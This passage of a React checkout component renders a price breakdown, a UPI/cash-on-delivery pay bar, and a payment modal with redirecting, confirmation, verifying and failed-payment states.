          {/* Price Popup (Toggled via VIEW PRICE DETAILS) */}
          {showPricePopup && (
            <div className={styles.pricePopup}>
              <div className={styles.pricePopupRow}>
                <span>Shipping:</span>
                <span className={styles.freeText}>FREE</span>
              </div>
              <div className={styles.pricePopupRow}>
                <span>Total Product Price:</span>
                <span>₹{cartTotal.toFixed(2)}</span>
              </div>
              {paymentMode === 'upi' && onlineDiscount > 0 && (
                <div className={`${styles.pricePopupRow} ${styles.discountPriceRow}`}>
                  <span>Online Discount:</span>
                  <span>-₹{onlineDiscount}</span>
                </div>
              )}
              {paymentMode === 'cod' && (
                <>
                  <div className={styles.pricePopupRow}>
                    <span>Payable Now (Advance):</span>
                    <span>₹{payableNow.toFixed(2)}</span>
                  </div>
                  <div className={styles.pricePopupRow}>
                    <span>Cash on Delivery:</span>
                    <span>₹{codBalancePayable.toFixed(2)}</span>
                  </div>
                </>
              )}
              <div className={styles.popupDivider} />
              <div className={`${styles.pricePopupRow} ${styles.orderTotalRow}`}>
                <strong>Total Order Value :</strong>
                <strong>₹{orderTotal.toFixed(2)}</strong>
              </div>
            </div>
          )}

          {/* Bar Content */}
          <div className={styles.bottomBarContent}>
            <div className={styles.bottomBarLeft}>
              <strong className={styles.bottomPrice}>
                ₹{activeStep === 2 ? orderTotal.toFixed(2) : payableNow.toFixed(2)}
              </strong>
              {activeStep === 3 && paymentMode === 'cod' && (
                <span className={styles.advancePaidHint}>₹99 Advance Booking</span>
              )}
              <button
                type="button"
                className={styles.viewPriceBtn}
                onClick={() => setShowPricePopup((v) => !v)}
              >
                VIEW PRICE DETAILS
              </button>
            </div>
            <button
              type="button"
              className={styles.payNowBtn}
              onClick={handlePayNow}
            >
              {activeStep === 2
                ? 'Continue'
                : paymentMode === 'cod'
                ? 'Pay ₹99 for COD'
                : 'PayNow'}
            </button>
          </div>
        </div>
      )}

      {/* ─── Payment Confirmation & Verification Modal ─── */}
      {paymentStatus !== 'idle' && (
        <div
          className={styles.paymentOverlay}
          onClick={handleCancelPayment}
        >
          <div
            className={styles.paymentModal}
            onClick={(e) => e.stopPropagation()}
            role="dialog"
            aria-modal="true"
            aria-label="Payment Confirmation"
          >
            {/* Top Close Button */}
            <button
              type="button"
              className={styles.modalCloseBtn}
              onClick={handleCancelPayment}
              aria-label="Close"
            >
              <RiCloseLine size={20} />
            </button>

            {/* 1. Redirecting State (Delay before confirmation popup) */}
            {paymentStatus === 'redirecting' && (
              <div className={styles.redirectingWrap}>
                <div className={styles.modalAppBadge}>
                  <div className={styles.modalAppLogoWrap}>
                    {(() => {
                      const app = UPI_APPS.find((a) => a.id === selectedUpiApp);
                      return app ? (
                        <img src={app.logo} alt={app.name} className={styles.modalAppLogo} />
                      ) : (
                        <RiShieldCheckFill size={36} className={styles.shieldIcon} />
                      );
                    })()}
                  </div>
                  <div className={styles.modalTitleBlock}>
                    <h3 className={styles.modalTitle}>
                      Opening {UPI_APPS.find((a) => a.id === selectedUpiApp)?.name || 'UPI App'}...
                    </h3>
                    <span className={styles.modalSubtitle}>Please approve the request in your payment app</span>
                  </div>
                </div>

                <div className={styles.waitingSpinner}>
                  <RiLoader4Line size={36} className={styles.spin} />
                  <span>Redirecting to your UPI app...</span>
                </div>

                <div className={styles.confirmAmountCard}>
                  <span className={styles.confirmAmountLabel}>Payable Amount</span>
                  <strong className={styles.confirmAmountVal}>₹{payableNow.toFixed(2)}</strong>
                </div>

                <button
                  type="button"
                  className={styles.confirmPaidBtn}
                  onClick={() => setPaymentStatus('confirming_choice')}
                >
                  Continue to Confirmation
                </button>
              </div>
            )}

            {/* 2. Confirmation Popup with Title & Yes/No Buttons */}
            {paymentStatus === 'confirming_choice' && (
              <div className={styles.confirmPromptWrap}>
                <div className={styles.modalAppBadge}>
                  <div className={styles.modalAppLogoWrap}>
                    {(() => {
                      const app = UPI_APPS.find((a) => a.id === selectedUpiApp);
                      return app ? (
                        <img src={app.logo} alt={app.name} className={styles.modalAppLogo} />
                      ) : (
                        <RiShieldCheckFill size={36} className={styles.shieldIcon} />
                      );
                    })()}
                  </div>
                  <div className={styles.modalTitleBlock}>
                    <h3 className={styles.modalTitle}>Payment Confirmation</h3>
                    <span className={styles.modalSubtitle}>
                      {paymentMode === 'cod' ? 'COD ₹99 Advance Booking' : 'UPI Online Payment'}
                    </span>
                  </div>
                </div>

                <div className={styles.confirmAmountCard}>
                  <div className={styles.confirmAmountHeader}>
                    <span className={styles.confirmAmountLabel}>Payable Amount</span>
                    <strong className={styles.confirmAmountVal}>₹{payableNow.toFixed(2)}</strong>
                  </div>
                  <div className={styles.confirmMetaRow}>
                    <span>Order #{orderId}</span>
                    <span>•</span>
                    <span className={styles.txnIdBadge}>{currentTxnRef}</span>
                  </div>
                </div>

                <div className={styles.confirmQuestionBox}>
                  <p className={styles.confirmQuestionText}>
                    Did you complete the payment in your UPI app?
                  </p>
                  <span className={styles.confirmHelpSubtext}>
                    Click &ldquo;Yes, Completed&rdquo; once approved so our system can instantly verify and dispatch your order.
                  </span>
                </div>

                {/* QR preview for desktop */}
                {!isMobile && qrDataUrl && (
                  <div className={styles.qrWrap}>
                    <div className={styles.qrCard}>
                      <img
                        src={qrDataUrl}
                        alt="UPI QR Code"
                        className={styles.qrImage}
                      />
                    </div>
                    <div className={styles.qrAmount}>
                      Scan QR with any UPI App (GPay, PhonePe, Paytm, BHIM)
                    </div>
                  </div>
                )}

                <div className={styles.confirmationBtnGrid}>
                  <button
                    type="button"
                    className={styles.confirmYesBtn}
                    onClick={handleChoiceYes}
                    id="confirm-payment-yes-btn"
                  >
                    <RiCheckLine size={20} />
                    <span>Yes, Completed</span>
                  </button>
                  <button
                    type="button"
                    className={styles.confirmNoBtn}
                    onClick={handleChoiceNo}
                    id="confirm-payment-no-btn"
                  >
                    <RiCloseLine size={18} />
                    <span>No, Not Yet</span>
                  </button>
                </div>

                {isMobile && (
                  <button
                    type="button"
                    className={styles.relaunchLink}
                    onClick={() => launchUpiApp(targetedUpiUri)}
                  >
                    UPI app didn&rsquo;t open? Tap here to retry
                  </button>
                )}

                <div className={styles.modalTrustFooter}>
                  <RiShieldCheckLine size={14} color="#19ea9a" />
                  <span>256-Bit Bank-Grade SSL Encrypted • 100% Discreet Packaging</span>
                </div>
              </div>
            )}

            {/* 3. Verifying / Checking Status State */}
            {paymentStatus === 'verifying' && (
              <div className={styles.verifyWrap}>
                <RiLoader4Line size={48} className={styles.spin} />
                <h3 className={styles.verifyTitle}>Checking Transaction Status...</h3>
                <p className={styles.verifySub}>
                  Communicating with bank network &amp; UPI switch
                </p>
                <div className={styles.progressBar}>
                  <div className={styles.progressFill} />
                </div>
              </div>
            )}

            {/* 4. Payment Failed with 2 Working Days Refund Notice */}
            {paymentStatus === 'failed' && (
              <div className={styles.failedWrap}>
                <div className={styles.failedIconCircle}>
                  <RiCloseCircleFill size={48} className={styles.failedRed} />
                </div>
                <h3 className={styles.failedTitle}>Payment Failed</h3>

                <div className={styles.failedRefundNotice}>
                  <RiErrorWarningLine size={18} className={styles.noticeIcon} />
                  <p>
                    Your payment could not be confirmed. If any money was deducted from your bank account or UPI app, don&rsquo;t worry, <strong>your money will be transferred / refunded back within 2 working days</strong>.
                  </p>
                </div>

                <div className={styles.failedSummaryCard}>
                  <div className={styles.failedSummaryRow}>
                    <span>Order ID:</span>
                    <strong>{orderId}</strong>
                  </div>
                  <div className={styles.failedSummaryRow}>
                    <span>Transaction Ref:</span>
                    <strong className={styles.txnRefText}>{currentTxnRef}</strong>
                  </div>
                  <div className={styles.failedSummaryRow}>
                    <span>Amount:</span>
                    <strong>₹{payableNow.toFixed(2)}</strong>
                  </div>
                  <div className={styles.failedSummaryRow}>
                    <span>Refund Status:</span>
                    <strong className={styles.refundStatusBadge}>Auto-Refund within 2 Days</strong>
                  </div>
                </div>

                <div className={styles.failedActions}>
                  <button
                    type="button"
                    className={styles.retryBtn}
                    onClick={handleRetryPayment}
                  >
                    <RiRefreshLine size={16} /> Retry Payment
                  </button>
                  <button
                    type="button"
                    className={styles.cancelFailedBtn}
                    onClick={handleCancelPayment}
                  >
                    Change Payment Method
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
